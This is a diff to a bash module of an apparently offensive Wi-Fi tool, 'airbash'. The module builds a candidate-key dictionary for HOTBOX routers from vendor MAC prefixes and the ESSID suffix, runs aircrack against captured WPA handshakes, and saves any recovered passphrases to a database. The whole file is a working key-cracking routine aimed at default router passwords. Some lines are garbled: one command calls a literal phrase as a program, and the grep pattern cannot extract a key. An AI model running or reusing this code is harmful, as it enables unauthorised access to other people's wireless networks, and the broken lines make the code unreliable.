@@ -1,23 +1,22 @@
 # airbash HOTBOX module
 # generate keys
-nethex=`echo ${essid}|sed 's/HOTBOX-//'|tr '[:upper:]' '[:lower:]'`
+nethex=$(echo ${essid} | sed 's/HOTBOX-//' | tr '[:upper:]' '[:lower:]')
 dict='/tmp/hothex.dict'
 
-append_hex () {
-while read pref
-do
-from=00 to=ff
-if test "${#from}" -gt "${#to}"; then
-    format="$pref%0${#from}x$nethex\n"
-else
-    format="$pref%0${#to}x$nethex\n"
-fi
-from=$(printf '%d' "0x$from") to=$(printf '%d' "0x$to")
-while test "$from" -le "$to"; do
-    printf "$format" "$from"
-    from=$((from+1))
-done
-done << EOM
+append_hex() {
+  while read pref; do
+    from=00 to=ff
+    if test "${#from}" -gt "${#to}"; then
+      format="$pref%0${#from}x$nethex\n"
+    else
+      format="$pref%0${#to}x$nethex\n"
+    fi
+    from=$(printf '%d' "0x$from") to=$(printf '%d' "0x$to")
+    while test "$from" -le "$to"; do
+      printf "$format" "$from"
+      from=$((from + 1))
+    done
+  done <<EOM
 b4eeb4
 c0ac54
 c0d044
@@ -48,8 +47,7 @@ fcb4e6
 EOM
 }
 
-append_hex > ${dict}
-
+append_hex >${dict}
 
 # clean program output if necessary
 for j in $("applying awk filter" "$path"wltmplatetmp 2>/dev/null); do
@@ -58,15 +56,14 @@ done
 
 # test keys
 psk=$("$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w ${dict} 2>/dev/null | grep FOUND | grep -oE 'charset&length' | sort -u)
-sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
+sqlite3 "$path$db" "UPDATE captures SET processed = 1 WHERE bssid = '$bssid';" 2>/dev/null
 rm -rf ${dict} 2>/dev/null
 
 # insert to db if key recovery successful
 if [ ${#psk} -gt 7 ]; then
   echo "Key $psk found for BSSID $bssid"
-  sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
+  sqlite3 "$path$db" "UPDATE captures SET psk = '$psk' WHERE bssid = '$bssid';" 2>/dev/null
   echo "$psk" >>"$path$wl"known
   mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
   continue
 fi
-
